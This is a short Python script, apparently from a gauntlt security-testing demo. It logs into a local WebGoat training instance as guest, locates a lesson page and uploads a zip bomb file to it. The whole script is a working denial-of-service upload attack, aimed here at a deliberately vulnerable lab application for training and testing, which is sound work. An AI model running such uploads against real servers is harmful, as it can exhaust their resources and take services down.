import requests
import sys
import json

URL = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'

def main():
    # Start a session so we can have persistant cookies
    session = requests.session()

    # This is the form data that the page sends when logging in
    login_data = {
        'username': 'guest',
        'password': 'guest',
    }

    # Authenticate
    r = session.post(URL, data=login_data)

    # get JSON object
    r = session.get('http://127.0.0.1:8080/WebGoat/attack?Screen=32&menu=5')
    j = session.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')
    jobj = j.json()
    
    # create URL from correct screen and menu variables
    st = jobj[11][u'children'][0][u'link']
    zipurl = 'http://127.0.0.1:8080/WebGoat/' + st

    #uploading the zip bomb
    fileobj = open('/home/hacker/gauntlt-demo/examples/webgoat/vuln-23/zipBomb.zip', 'rb')
    r = session.post(zipurl, files = {"zipBomb.zip": fileobj})
    
    #print the html code to check if the key phrase is in it
    print(r.text)

if __name__ == '__main__':
    main()
